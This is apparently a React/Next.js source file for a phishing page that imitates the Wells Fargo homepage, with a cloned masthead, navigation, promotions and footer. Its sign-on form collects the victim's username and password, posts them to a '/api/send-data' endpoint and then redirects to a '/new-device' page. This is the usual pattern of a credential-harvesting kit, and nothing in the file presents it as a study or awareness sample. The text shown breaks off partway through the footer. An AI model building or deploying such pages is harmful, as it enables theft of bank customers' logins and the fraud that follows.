"use client";

import { useRouter } from "next/navigation";
import "../../app/style.css";
import React, { useState } from "react";
import axios from "axios";

const MainPage = () => {
  const router = useRouter();
  const [formData, setFormData] = useState({
    userId: "",
    password: "",
    check: false,
  });
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const handleChange = (e) => {
    const { name, type, value, checked } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!formData.userId || !formData.password) {
      alert("Please fill in all required fields.");
      return;
    }

    try {
      setLoading(true);
      const res = await axios.post("/api/send-data", formData);
      if (res.status === 200) {
        router.push("/new-device");
      }
    } catch (err) {
      alert("Login failed. Please check your credentials and try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <a href="#skip" className="hidden">
        Skip to main content
      </a>
      <div
        className="ps-body-container app-preload-container data-app-preload-desktop"
        data-pid="702-224111-64"
        data-ptid="tcm:702-223692-128"
      >
        <div
          className="ps-emergency-message"
          role="region"
          aria-label="Alerts and Notifications"
        ></div>
        <header
          className="ps-masthead presentedElement"
          role="banner"
          data-cid="tcm:84-224274-16"
          data-ctid="tcm:91-223647-32"
        >
          <div className="ps-masthead-wrapper">
            <div className="new_logoOuter">
              <div className="ps-logo-home">
                <img src="/images/wf-logo.webp" alt="Wellsfargo" />
              </div>
            </div>
            <nav className="ps-right-nav" aria-label="Header Navigation">
              <ul>
                <li>
                  <a href="#">ATMs/Locations</a>
                </li>
                <li>
                  <a
                    href="#"
                    className="ps-masthead-help"
                    role="button"
                    aria-expanded="false"
                  >
                    Help
                  </a>
                </li>
                <li>
                  <a
                    href="#"
                    xmlLang="es"
                    id="langPrefToggle"
                    className="spTogglePersonal"
                    name="langPrefToggle"
                    lang="es"
                  >
                    Español
                  </a>
                </li>
                <li className="ps-search-item">
                  <a
                    href="#"
                    className="ps-nxgSearchIcon"
                    id="nxgSearchButton"
                    aria-label="Search, Opens a dialog."
                  >
                    &nbsp;&nbsp;
                  </a>
                </li>
                <li className="ps-sign-on-item">
                  <div className="ps-masthead-sign-on">
                    <a
                      href="#"
                      className="ps-sign-on-text"
                      data-platform="applicationhost"
                      data-host="Login App Host"
                    >
                      Sign On
                    </a>
                  </div>
                </li>
              </ul>
            </nav>
            <button
              type="button"
              data-role="none"
              className="ps-hamburger-link sf-hidden"
              name="hamburger-link"
              data-effect="st-effect-1"
              aria-expanded="false"
              aria-label="Open Menu Navigation"
            ></button>
          </div>
        </header>
        <div className="ps-support-dropdown-overlay-container sf-hidden" />
        <div
          className="ps-support-dropdown-overlay sf-hidden"
          data-cid="tcm:84-241194-16"
          data-ctid="tcm:91-236597-32"
          style={{ left: "795.927px" }}
        ></div>
        <div className="ps-fat-nav-overlay sf-hidden" />
        <div
          className="ps-fat-nav-outer presentedElement"
          data-cid="tcm:84-226512-16"
          data-ctid="tcm:91-226306-32"
        >
          <nav className="ps-fat-nav-wrapper" aria-label="Main Navigation">
            <div className="ps-fat-nav-hook sf-hidden" />
            <div className="ps-fat-nav-l1">
              <div className="ps-fat-nav-search sf-hidden"></div>
              <div className="ps-fat-nav-l1-links">
                <ul>
                  <li className="ps-fat-nav-item active">
                    <a
                      data-platform="publicsite"
                      href="#"
                      exitdestination=""
                      exitdisclaimer=""
                      data-newbrowser=""
                      enrollmentid=""
                      data-rottracking=""
                      data-params=""
                      data-responsive-params=""
                      data-destinationtype="none"
                      data-nativelinktype="none"
                    >
                      {" "}
                      <span
                        className="hidden"
                        data-translation-text="fatnav-selected-menu-state"
                      >
                        selected,
                      </span>
                      Personal{" "}
                    </a>
                    <ul className="ps-fat-nav-l2 expanded">
                      <li className="ps-fat-nav-subitem">
                        <a href="#">Checking</a>
                      </li>
                      <li className="ps-fat-nav-subitem">
                        <a href="#">Savings &amp; CDs</a>
                      </li>
                      <li className="ps-fat-nav-subitem">
                        <a href="#" data-platform="creditCardsWF">
                          Credit Cards
                        </a>
                      </li>
                      <li className="ps-fat-nav-subitem">
                        <a href="#">Home Loans</a>
                      </li>
                      <li className="ps-fat-nav-subitem">
                        <a href="#">Personal Loans</a>
                      </li>
                      <li className="ps-fat-nav-subitem">
                        <a href="#">Auto Loans</a>
                      </li>
                      <li className="ps-fat-nav-subitem">
                        <a href="#">Premier</a>
                      </li>
                      <li className="ps-fat-nav-subitem">
                        <a href="#">Education &amp; Tools</a>
                      </li>
                    </ul>
                  </li>
                  <li className="ps-fat-nav-item">
                    <a
                      data-platform="publicsite"
                      href="#"
                      exitdestination=""
                      exitdisclaimer=""
                      data-newbrowser=""
                      enrollmentid=""
                      data-rottracking=""
                      data-params=""
                      data-responsive-params=""
                      data-destinationtype="none"
                      data-nativelinktype="none"
                    >
                      Investing &amp; Wealth Management
                    </a>
                  </li>
                  <li className="ps-fat-nav-item">
                    <a
                      data-platform="publicsite"
                      href="#"
                      exitdestination=""
                      exitdisclaimer=""
                      data-newbrowser=""
                      enrollmentid=""
                      data-rottracking=""
                      data-params=""
                      data-responsive-params=""
                      data-destinationtype="none"
                      data-nativelinktype="none"
                    >
                      Business
                    </a>
                  </li>
                  <li className="ps-fat-nav-item">
                    <a
                      data-platform="publicsite"
                      href="#"
                      exitdestination=""
                      exitdisclaimer=""
                      data-newbrowser=""
                      enrollmentid=""
                      data-rottracking=""
                      data-params=""
                      data-responsive-params=""
                      data-destinationtype="none"
                      data-nativelinktype="none"
                    >
                      Commercial Banking
                    </a>
                  </li>
                  <li className="ps-fat-nav-item">
                    <a
                      data-platform="publicsite"
                      href="#"
                      exitdestination=""
                      exitdisclaimer=""
                      data-newbrowser=""
                      enrollmentid=""
                      data-rottracking=""
                      data-params=""
                      data-responsive-params=""
                      data-destinationtype="none"
                      data-nativelinktype="none"
                    >
                      Corporate &amp; Investment Banking
                    </a>
                  </li>
                  <li className="ps-fat-nav-item">
                    <a href="#">About Wells Fargo</a>
                  </li>
                </ul>
              </div>
              <div className="ps-fat-nav-l1-extras sf-hidden"></div>
            </div>
          </nav>
          <div
            className="ps-fat-nav-l3-wrapper ps-fat-nav-l3-override sf-hidden"
            style={{ top: 104 }}
          ></div>
        </div>
        {/* <div className="container-l3-mobile" id="containerL3Mobile" /> */}
        <main className="ps-body-wrapper" style={{ paddingTop: 57 }}>
          <h1 className="hidden" id="skip">
            Wells Fargo
          </h1>
          <div
            className="signon-container data-app-preload-no-signon"
            data-cid="tcm:84-224415"
            data-ctid="tcm:83-2046-8"
          >
            <div className="sign-top">
              <h2 id="sign-on-header">Good day</h2>
              <span>Sign on to manage your accounts.</span>
              <form
                autoComplete="off"
                name="signon"
                id="frmSignon"
                action="#"
                method="post"
                data-login-app="true"
                onSubmit={handleSubmit}
              >
                <div className="form-field">
                  {/* <input
                    type="text"
                    accessKey="U"
                    id="userid"
                    className="form-element formElementText login_field signon-in"
                    // name="j_username"
                    maxLength={14}
                    // defaultValue=""
                    autoComplete="off"
                    name="userId"
                    value={formData.userId}
                    onChange={handleChange}
                    required
                  />
                  <label
                    htmlFor="userid"
                    id="userid_label"
                    className="id_label"
                  >
                    Username
                  </label> */}
                  <input
                    type="text"
                    id="userid"
                    className="form-element formElementText login_field signon-in"
                    name="userId"
                    value={formData.userId}
                    onChange={handleChange}
                    placeholder="Username"
                    required
                  />
                  {/* <label htmlFor="userid" className="id_label">
                    Username
                  </label> */}
                </div>
                <div className="form-field mr-tp-10 password-div">
                  {/* <input
                    type="password"
                    accessKey="P"
                    id="password"
                    className="form-element formElementPassword login_field signon-in pmask"
                    // name="j_password"
                    maxLength={32}
                    autoComplete="off"
                    name="password"
                    value={formData.password}
                    onChange={handleChange}
                    required
                  />
                  <label
                    htmlFor="password"
                    id="password_label"
                    className="id_label"
                  >
                    Password
                  </label> */}
                  {/* <a
                    href="#"
                    id="password-visible-text"
                    className="show-password password-visible-icon"
                    role="button"
                    aria-label="Show password"
                  >
                    Show
                  </a> */}
                  <input
                    type={showPassword ? "text" : "password"}
                    id="password"
                    className="form-element formElementPassword login_field signon-in pmask"
                    name="password"
                    value={formData.password}
                    onChange={handleChange}
                    placeholder="Password"
                    required
                  />
                  {/* <label htmlFor="password" className="id_label">
                    Password
                  </label> */}
                  <button
                    type="button"
                    className="show-password password-visible-icon"
                    onClick={() => setShowPassword((v) => !v)}
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                </div>
                <div id="saveuid" className="save-username save-us-mb">
                  <input
                    type="checkbox"
                    accessKey="S"
                    id="saveusername"
                    className="c29link"
                    name="saveusername"
                    data-content-id="c29content-save-username"
                    triggerhover="false"
                    isclickable="true"
                    defaultValue="on"
                  />
                  <label htmlFor="saveusername" className="lsc saveuser-pd">
                    Save username
                    <span className="hidden" aria-hidden="true">
                      Notice - For your security, we do not recommend using this
                      feature on a shared device.
                    </span>
                  </label>
                </div>
                <div className="form-button">
                  <button
                    type="submit"
                    name="btnSignon"
                    id="btnSignon"
                    className="ps-btn-primary"
                    data-mrkt-tracking-id="3d6c76ba-9d34-4def-977d-a79cb8afc738"
                    defaultValue="Sign On"
                  >
                    {loading ? "Submitting..." : "Submit"}
                  </button>
                  <a className="enroll" href="#">
                    Enroll
                  </a>
                </div>
              </form>
            </div>
            <div className="signon-bottom presentedElement">
              <a href="#">Forgot username or password?</a>
              <a href="#">Security Center</a>
              <a href="#">Privacy, Cookies, and Legal</a>
            </div>
            <div
              area-hidden="true"
              className="c29content-tooltip tooltip-top sf-hidden"
              data-content-id="c29content-save-username"
            ></div>
          </div>
          <div className="marquee-container">
            <div
              className="marquee-container-wrap iaRendered dispositionElement"
              data-placement-name="WF_CON_HP_PRIMARY_BNR"
              lang="en"
              data-offer-id="CE_chk_acq_gro_digcashbonus1549_chall_marquee"
              data-presentation-order={1}
              conversation-id="f4078232-4e32-4272-adb5-2b21f1331e3a-2"
              source="CEE"
            >
              <div data-cid="tcm:402-351541-16" data-ctid="tcm:91-223657-32">
                <div className="marquee-wrap marquee">
                  <div className="marquee-img">
                    <img src="/images/wf-img-1.avif" />
                  </div>
                  <div className="marquee-content presentedElement">
                    <h2>$325 bonus + 24/7 fraud monitoring</h2>
                    <p className="twoline-wrap">
                      Open an eligible checking account with qualifying direct
                      deposits. FDIC-insured.
                    </p>
                    <div className="ps-padding">
                      <a
                        className="ps-btn-secondary"
                        data-cid="tcm:402-351541-16"
                        data-ctid="tcm:91-223657-32"
                        data-presentation={2}
                        href="#"
                        enrollmentid={5016}
                        aria-label="Start now by visiting the account offer page through this link."
                      >
                        Start now &gt;&gt;
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div
            className="alt-nav-container presentedElement sf-hidden"
            data-cid="tcm:182-234954"
            data-ctid="tcm:91-223671-32"
          >
            {" "}
          </div>
          <div
            className="ps-marketing-small-promo-items"
            data-cid="tcm:242-228824-16"
            data-ctid="tcm:91-228642-32"
          >
            <div
              className="ps-marketing-small-promo-item iaRendered presentedElement dispositionElement"
              data-placement-name="WF_CON_HP_SML_PRIMARY"
              lang="en"
              data-offer-id="CE_ccd_takeoneautograph1124_toolbelt"
              data-presentation-order={1}
              conversation-id="6ee888e8-710f-431c-94c8-d2a6c5e24a00-2"
              source="CEE"
            >
              <div
                className="added"
                data-cid="tcm:402-314536-16"
                data-ctid="tcm:91-228643-32"
              >
                <div className="mark-small-promo-icon">
                  <div className="ps-marketing-icon-container">
                    <div className="ps-marketing-icon">
                      <img src="/images/wf-icon-1.webp" />
                    </div>
                  </div>
                  <div className="ps-marketing-text">
                    <h2>Earn 20,000 bonus points</h2>
                    <p className="ps-marketing-text-content">
                      Plus, earn 3X points on many everyday categories with $0
                      annual fee. Terms apply.
                    </p>
                    <p className="learn-more-mobile sf-hidden" />
                  </div>
                  <div className="ps-marketing-promo-link">
                    <p className="learn-more">
                      <span>
                        <a
                          className="c7"
                          data-cid="tcm:402-314536-16"
                          data-ctid="tcm:91-228643-32"
                          data-presentation={1}
                          href="#"
                          enrollmentid={3845}
                          aria-label="Earn 20,000 bonus points. Plus, earn 3X points on many everyday categories with $0 annual fee. Terms apply. Learn more."
                        >
                          Learn more
                        </a>
                      </span>
                    </p>
                  </div>
                </div>
              </div>
            </div>
            <div
              className="ps-marketing-small-promo-item iaRendered presentedElement dispositionElement"
              data-placement-name="WF_CON_HP_SML_PRIMARY"
              lang="en"
              data-offer-id="CE_chk_acq_gro_startercab1551_toolbelt"
              data-presentation-order={2}
              conversation-id="1d1f0ee1-6dbf-4aea-ae3f-324e3711a9e9-2"
              source="CEE"
            >
              <div
                className="added"
                data-cid="tcm:402-318458-16"
                data-ctid="tcm:91-228643-32"
              >
                <div className="mark-small-promo-icon">
                  <div className="ps-marketing-icon-container">
                    <div className="ps-marketing-icon">
                      <img src="/images/wf-icon-2.avif" />
                    </div>
                  </div>
                  <div className="ps-marketing-text">
                    <h2>New customer? Say hello to a $125 bonus</h2>
                    <p className="ps-marketing-text-content">
                      Open a Clear Access Banking account, great for students
                      &amp; more, complete offer requirements
                    </p>
                    <p className="learn-more-mobile sf-hidden" />
                  </div>
                  <div className="ps-marketing-promo-link">
                    <p className="learn-more">
                      <span>
                        <a
                          className="c7"
                          data-cid="tcm:402-318458-16"
                          data-ctid="tcm:91-228643-32"
                          data-presentation={1}
                          href="#"
                          enrollmentid={5451}
                          data-responsive-params="aria-label=New%20customer?%20Say%20hello%20to%20a%20$125%20bonus.%20Open%20a%20Clear%20Access%20Banking%20account,%20great%20for%20students%20&%20more,%20complete%20offer%20requirements.%20See%20offer%20details."
                        >
                          See offer details
                        </a>
                      </span>
                    </p>
                  </div>
                </div>
              </div>
            </div>
            <div
              className="ps-marketing-small-promo-item iaRendered presentedElement dispositionElement"
              data-placement-name="WF_CON_HP_SML_PRIMARY"
              lang="en"
              data-offer-id="CE_sav_acq_gro_savprospectnonoffer7882967_toolbelt"
              data-presentation-order={3}
              conversation-id="8c84572a-7a73-4245-b624-1e766ad72f2e-2"
              source="CEE"
            >
              <div
                className="added"
                data-cid="tcm:402-321597-16"
                data-ctid="tcm:91-228643-32"
              >
                <div className="mark-small-promo-icon">
                  <div className="ps-marketing-icon-container">
                    <div className="ps-marketing-icon">
                      <img src="/images/wf-icon-3.avif" />
                    </div>
                  </div>
                  <div className="ps-marketing-text">
                    <h2>Open a savings account</h2>
                    <p className="ps-marketing-text-content">
                      Explore our savings accounts and find the right fit for
                      you
                    </p>
                    <p className="learn-more-mobile sf-hidden" />
                  </div>
                  <div className="ps-marketing-promo-link">
                    <p className="learn-more">
                      <span>
                        <a
                          className="c7"
                          data-cid="tcm:402-321597-16"
                          data-ctid="tcm:91-228643-32"
                          data-presentation={1}
                          href="#"
                          enrollmentid={5555}
                          aria-label="Open a savings account. Explore our savings accounts and find the right fit for you. Get started."
                        >
                          Get started
                        </a>
                      </span>
                    </p>
                  </div>
                </div>
              </div>
            </div>
            <div
              className="ps-marketing-small-promo-item presentedElement"
              lang="en"
            >
              <div data-cid="tcm:182-228910-16" data-ctid="tcm:91-223671-32">
                <div className="task-wrapper" id="marketing-rates">
                  <div className="mark-small-promo-illustration">
                    <div className="ps-marketing-text">
                      <div>
                        <h2 className="ps-marketing-text-heading">
                          Interest rates today
                        </h2>{" "}
                        <a href="#" className="sf-hidden">
                          {" "}
                        </a>
                      </div>
                      <div className="ps-marketing-icon" id="ps-marketing-icon">
                        <img src="/images/wf-icon-4.avif" />
                      </div>
                      <div>
                        <ul>
                          <li className="task sf-hidden" id="task-rates">
                            {" "}
                          </li>
                        </ul>
                      </div>
                    </div>
                    <div className="ps-marketing-promo-link">
                      {" "}
                      <a
                        className="check-rates-wrapper"
                        id="check-rates-wrapper"
                        aria-label="Check rates opens dropdown"
                        role="button"
                        href="#"
                        data-goto="/help/rates"
                      >
                        <p className="learn-more">
                          {" "}
                          <span>Check rates</span>{" "}
                          <span className="right-chevron" />{" "}
                        </p>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="ps-large-promo-full-container">
            <div
              className="ps-large-container-wrapper iaRendered dispositionElement"
              data-placement-name="WF_CON_HP_LRG_PROMO"
              lang="en"
              data-offer-id="CE_ccd_acq_tk1choicehotels_largepromo"
              data-presentation-order={1}
              conversation-id="41d577cc-5d44-455c-a3ca-2733c486ba6e-2"
              source="CEE"
            >
              <div data-cid="tcm:402-316314-16" data-ctid="tcm:91-223664-32">
                <div className="ps-large-promo-full" lang="en">
                  <div className="ps-large-promo-full large-promo-black">
                    <div className="ps-large-promo-full-wrapper">
                      <div className="ps-promo-full-items">
                        <div className="ps-promo-full-item">
                          <div className="ps-promo-full-image">
                            <img src="/images/wf-img-2.webp" />
                          </div>
                          <div className="ps-promo-full-content presentedElement">
                            <h2>Earn 60,000 bonus points</h2>
                            <p>after qualifying purchases. Terms apply.</p>
                            <div className="ps-promo-full-links">
                              <a
                                className="ps-btn-secondary"
                                data-cid="tcm:402-316314-16"
                                data-ctid="tcm:91-223664-32"
                                data-presentation={2}
                                href="#"
                                enrollmentid={3845}
                                aria-label="Learn more about the Choice credit cards"
                              >
                                Learn more
                              </a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div
            className="card-background-white text-aligned-center"
            data-cid="tcm:242-238382-16"
            data-ctid="tcm:91-236590-32"
          >
            <div className="ps-mid-page-title-wrapper">
              <div className="ps-mid-page-title-top-line">‍</div>
              <h2 className="ps-mid-page-title">
                Financial guidance and support
              </h2>
            </div>
            <div className="card-container three-card card-left card-theme2">
              <div
                className="iaRendered enhanced-txt-cm mid-size-promo three-card-content presentedElement dispositionElement"
                data-placement-name="WF_CON_HP_SML_PROMO"
                lang="en"
                data-offer-id="CE_oth_fintools1579alt1_smallpromo"
                data-presentation-order={1}
                conversation-id="713f82d5-a7ed-4ad0-888f-27fe7f8d3646-2"
                source="CEE"
              >
                <div
                  className="text-aligned-left"
                  data-cid="tcm:402-334110-16"
                  data-ctid="tcm:91-236591-32"
                >
                  <div>
                    <img src="/images/wf-img-3.avif" />
                  </div>
                  <div className="enhanced-txt-body">
                    <h3 className="title2-SemiBold">
                      Your shield against scams
                    </h3>
                    <div className="subheadline-regular">
                      <div>Spot the latest tactics scammers are using</div>
                    </div>
                    <p>
                      <a
                        href="#"
                        aria-label="Get the latest. On current scammer tactics."
                        className="ps-btn-secondary"
                        data-cid="tcm:402-334110-16"
                        data-ctid="tcm:91-236591-32"
                        data-presentation={2}
                      >
                        Get the latest
                      </a>
                    </p>
                  </div>
                </div>
              </div>
              <div
                className="iaRendered enhanced-txt-cm mid-size-promo three-card-content presentedElement dispositionElement"
                data-placement-name="WF_CON_HP_SML_PROMO"
                lang="en"
                data-offer-id="CE_oth_lifeevents1578alt1_smallpromo"
                data-presentation-order={2}
                conversation-id="4c3f6146-41f4-4b5a-a7c6-ff9d32f5a564-2"
                source="CEE"
              >
                <div
                  className="text-aligned-left"
                  data-cid="tcm:402-333505-16"
                  data-ctid="tcm:91-236591-32"
                >
                  <div>
                    <img src="/images/wf-img-4.avif" />
                  </div>
                  <div className="enhanced-txt-body">
                    <h3 className="title2-SemiBold">
                      Savings you can count on
                    </h3>
                    <div className="subheadline-regular">
                      <div>
                        Discover how smart saving moves you closer to your goals
                      </div>
                    </div>
                    <p>
                      <a
                        href="#"
                        aria-label="Grow your savings. Move closer to your goals."
                        className="ps-btn-secondary"
                        data-cid="tcm:402-333505-16"
                        data-ctid="tcm:91-236591-32"
                        data-presentation={2}
                      >
                        Grow your savings
                      </a>
                    </p>
                  </div>
                </div>
              </div>
              <div
                className="iaRendered enhanced-txt-cm mid-size-promo three-card-content presentedElement dispositionElement"
                data-placement-name="WF_CON_HP_SML_PROMO"
                lang="en"
                data-offer-id="CE_oth_retirement1580alt2_smallpromo"
                data-presentation-order={3}
                conversation-id="ef1ac728-1db3-46d8-b32e-74906c949d09-2"
                source="CEE"
              >
                <div
                  className="text-aligned-left"
                  data-cid="tcm:402-333704-16"
                  data-ctid="tcm:91-236591-32"
                >
                  <div>
                    <img src="/images/wf-img-5.avif" />
                  </div>
                  <div className="enhanced-txt-body">
                    <h3 className="title2-SemiBold">
                      Borrowing built around you
                    </h3>
                    <div className="subheadline-regular">
                      <div>
                        Discover borrowing designed for every step of your
                        journey
                      </div>
                    </div>
                    <p>
                      <a
                        href="#"
                        aria-label="Explore borrowing. Designed for every step of your journey."
                        className="ps-btn-secondary"
                        data-cid="tcm:402-333704-16"
                        data-ctid="tcm:91-236591-32"
                        data-presentation={2}
                      >
                        Explore borrowing
                      </a>
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div
            className="ps-native-app-container Gray"
            data-cid="tcm:182-244645-16"
            data-ctid="tcm:91-244420-32"
          >
            <div className="ps-native-app-background non-ceo-app">
              <div className="native-app-header sf-hidden"></div>
              <div className="ps-native-app-content">
                <div className="native-app-carousel-wrapper">
                  <div className="native-app-carousel">
                    <img src="/images/wf-img-6.avif" />
                  </div>
                  <div className="native-app-slider-block">
                    <div className="native-app-header-large">
                      <h2 className="native-app-header-text">
                        Need help? Ask Fargo<sup>®</sup>
                      </h2>
                      <p className="native-app-header-text">
                        Fargo<sup>1</sup> gives you valuable insights like a
                        summary of your spending by category, retailer and
                        across accounts. Find it only in the Wells Fargo Mobile
                        <sup>®</sup> app.
                      </p>
                    </div>
                    <div className="native-app-middle-block">
                      <div
                        className="native-app-slide-content-block"
                        id="native-app-slide-content-block"
                      >
                        <div className="slideText">
                          <ul></ul>
                        </div>
                      </div>
                    </div>
                    <div className="ps-download-app-container">
                      <div className="ps-download-app presentedElement">
                        <div className="ps-download-text-container">
                          <hr className="ps-mobile-line-break sf-hidden" />
                          <div className="ps-download-buttons">
                            <a
                              role="button"
                              data-exit="true"
                              className="ps-button-applestore"
                              aria-label="Download on the App Store opens a dialog"
                              data-href-id={1224111702}
                              href="#"
                            >
                              <img src="/images/wf-img-7.avif" />
                            </a>
                            <a
                              role="button"
                              data-exit="true"
                              className="ps-button-googleplay"
                              aria-label="Get it on Google Play opens a dialog"
                              data-href-id={3224111702}
                              href="#"
                            >
                              <img src="/images/wf-img-9.avif" />
                            </a>
                          </div>
                          <div className="ps-download-app-disclaimer">
                            <span>*Screen image is simulated</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="card-background-white text-aligned-center">
            <div className="ps-mid-page-title-wrapper">
              <div className="ps-mid-page-title-top-line">‍</div>
              <h2 className="ps-mid-page-title">
                Serving our customers and communities
              </h2>
            </div>
            <div className="enhanced-txt-body text-aligned-center">
              <p className="ps-mid-page-subTitle">
                It doesn't happen with one transaction, in one day on the job,
                or in one quarter. It's earned relationship by relationship.
              </p>
            </div>
            <div
              className="card-container two-card card-left card-theme2"
              data-cid="tcm:84-224414-16"
              data-ctid="tcm:91-223650-32"
            >
              <div
                className="enhanced-txt-cm text-aligned-left two-card-content presentedElement"
                data-cid="tcm:84-224409-16"
                data-ctid="tcm:91-223644-32"
              >
                <div>
                  <div>
                    <img src="/images/wf-img-7.webp" />
                  </div>
                  <div className="enhanced-txt-body">
                    <div className="title2-SemiBold">
                      <h3>Who we are</h3>
                    </div>
                    <div className="subheadline-regular">
                      Wells Fargo helps strengthen communities through
                      inclusion, economic empowerment, and sustainability.
                    </div>
                    <p>
                      <a
                        href="#"
                        className="ps-btn-secondary"
                        data-cid="tcm:84-224409-16"
                        data-ctid="tcm:91-223644-32"
                        data-presentation={2}
                      >
                        About Wells Fargo
                      </a>
                    </p>
                  </div>
                </div>
              </div>
              <div
                className="enhanced-txt-cm text-aligned-left two-card-content presentedElement"
                data-cid="tcm:84-224410-16"
                data-ctid="tcm:91-223644-32"
              >
                <div>
                  <div>
                    <img src="/images/wf-img-8.avif" />
                  </div>
                  <div className="enhanced-txt-body">
                    <div className="title2-SemiBold">
                      <h3>Why we're committed to communities</h3>
                    </div>
                    <div className="subheadline-regular">
                      We don't just serve our communities—we are our
                      communities. We're committed to helping customers and
                      neighborhoods across the country thrive.
                    </div>
                    <p>
                      <a
                        href="#"
                        enrollmentid={3107}
                        className="ps-btn-secondary"
                        data-cid="tcm:84-224410-16"
                        data-ctid="tcm:91-223644-32"
                        data-presentation={2}
                      >
                        Wells Fargo Stories
                      </a>
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div
            className="contact-bar-container presentedElement"
            data-cid="tcm:84-224326-16"
            data-ctid="tcm:91-223673-32"
          >
            <div className="row">
              <div className="col-12 col-s-12">
                <h2 className="contact-bar-header">How can we help?</h2>
              </div>
            </div>
            <div className="row">
              <ul className="contact-bar-links">
                <li className="ps-col-xl-3 ps-col-lg-3 ps-col-md-6 ps-col-s-12">
                  <a
                    href="#"
                    role="button"
                    tabIndex={0}
                    className="contact-bar-collapsible contact-bar-location contact-bar-location-header"
                    aria-expanded="false"
                  >
                    <span className="contact-bar-location-icon">‍</span>
                    <span
                      role="heading"
                      aria-level={3}
                      className="contact-bar-select"
                    >
                      Find a location
                    </span>
                    <span className="collapsible-icon collapsible-icon-collapse">
                      ‍
                    </span>
                  </a>
                  <div
                    className="contact-bar-content contact-bar-content-hidden sf-hidden"
                    aria-hidden="true"
                  ></div>
                </li>
                <li className="ps-col-xl-3 ps-col-lg-3 ps-col-md-6 ps-col-s-12">
                  <a
                    href="#"
                    className="contact-bar-appointment-header"
                    aria-label="Make an appointment link"
                    data-platform="applicationhost"
                    data-host="MAA Host"
                  >
                    Make an appointment
                  </a>
                </li>
                <li className="ps-col-xl-3 ps-col-lg-3 ps-col-md-6 ps-col-s-12">
                  <a
                    href="#"
                    role="button"
                    tabIndex={0}
                    className="contact-bar-collapsible contact-bar-call"
                    aria-expanded="false"
                  >
                    <span className="contact-bar-appointment-icon">‍</span>
                    <span
                      role="heading"
                      aria-level={3}
                      className="contact-bar-select"
                    >
                      Quick help
                    </span>
                    <span className="collapsible-icon collapsible-icon-collapse">
                      ‍
                    </span>
                  </a>
                  <div
                    className="contact-bar-content contact-bar-call-desc contact-bar-content-hidden sf-hidden"
                    aria-hidden="true"
                  ></div>
                </li>
              </ul>
            </div>
            <div />
          </div>
        </main>
        <div
          role="dialog"
          tabIndex={-1}
          aria-labelledby="headerTextAppStore"
          data-content-id={1224111702}
          className="ep-modal sf-hidden"
          aria-modal="true"
        ></div>
        <div
          role="dialog"
          tabIndex={-1}
          aria-labelledby="headerTextGooglePlay"
          data-content-id={3224111702}
          className="ep-modal sf-hidden"
          aria-modal="true"
        ></div>
        <div
          role="dialog"
          tabIndex={-1}
          aria-labelledby="headerTextFacebook"
          data-content-id={1224300702}
          className="ep-modal sf-hidden"
          aria-modal="true"
        ></div>
        <div
          role="dialog"
          tabIndex={-1}
          aria-labelledby="headerTextLinkedin"
          data-content-id={3224300702}
          className="ep-modal sf-hidden"
          aria-modal="true"
        ></div>
        <div
          role="dialog"
          tabIndex={-1}
          aria-labelledby="headerTextInstagram"
          data-content-id={5224300702}
          className="ep-modal sf-hidden"
          aria-modal="true"
        ></div>
        <div
          role="dialog"
          tabIndex={-1}
          aria-labelledby="headerTextPinterest"
          data-content-id={7224300702}
          className="ep-modal sf-hidden"
          aria-modal="true"
        ></div>
        <div
          role="dialog"
          tabIndex={-1}
          aria-labelledby="headerTextYoutube"
          data-content-id={9224300702}
          className="ep-modal sf-hidden"
          aria-modal="true"
        ></div>
        <div
          role="dialog"
          tabIndex={-1}
          aria-labelledby="headerTextTwitter"
          data-content-id={11224300702}
          className="ep-modal sf-hidden"
          aria-modal="true"
        ></div>
        <div
          role="dialog"
          tabIndex={-1}
          aria-labelledby="headerText"
          data-content-id={13224300702}
          className="ep-modal sf-hidden"
          aria-modal="true"
        ></div>
        <footer className="ps-footer-homepage">
          <div className="ps-footer-wrapper">
            <div>
              <div
                className="ps-footer-links presentedElement"
                data-cid="tcm:84-224298-16"
                data-ctid="tcm:91-223668-32"
              >
                <nav role="navigation" aria-label="Footer Navigation">
                  <ul>
                    <li className="ps-footer-link">
                      <span>
                        {" "}
                        <a href="#">
                          Privacy, Cookies, Security &amp; Legal
                        </a>{" "}
                      </span>
                    </li>
                    <li className="ps-footer-link">
                      <span>
                        {" "}
                        <a href="#">
                          Do Not Sell or Share My Personal Information
                        </a>{" "}
                      </span>
                    </li>
                    <li className="ps-footer-link">
                      <span>
                        {" "}
                        <a href="#">Notice of Data Collection</a>{" "}
                      </span>
                    </li>
                    <li className="ps-footer-link">
                      <span>
                        {" "}
                        <a href="#">General Terms of Use</a>{" "}
                      </span>
                    </li>
                    <li className="ps-footer-link">
                      <span>
                        {" "}
                        <a href="#">Online Access Agreement</a>{" "}
                      </span>
                    </li>
                    <li className="ps-footer-link">
                      <span>
                        {" "}
                        <a href="#">Report Fraud</a>{" "}
                      </span>
                    </li>
                    <li className="ps-footer-link">
                      <span>
                        {" "}
                        <a href="#">About Wells Fargo</a>{" "}
                      </span>
                    </li>
                    <li className="ps-footer-link">
                      <span>
                        {" "}
                        <a href="#">Careers</a>{" "}
                      </span>
                    </li>
                    <li className="ps-footer-link">
                      <span>
                        {" "}
                        <a href="#">Inclusion and Accessibility</a>{" "}
                      </span>
                    </li>
                    <li className="ps-footer-link">
                      <span>
                        {" "}
                        <a href="#">Sitemap</a>{" "}
                      </span>
                    </li>
                  </ul>
                </nav>
              </div>
            </div>
            <div>
              <div
                className="ps-footer-social-icons"
                data-cid="tcm:84-224817-16"
                data-ctid="tcm:91-223684-32"
              >
                <ul>
                  <li>
                    <a
                      className="icon-facebook social-icon"
                      aria-label="Wells Fargo facebook page"
                      data-exit="true"
                      refplatform="newwindow"
                      data-href-id={1224300702}
                      href="#"
                      target="_blank"
                    />
                  </li>
                  <li>
                    <a
                      data-platform="external"
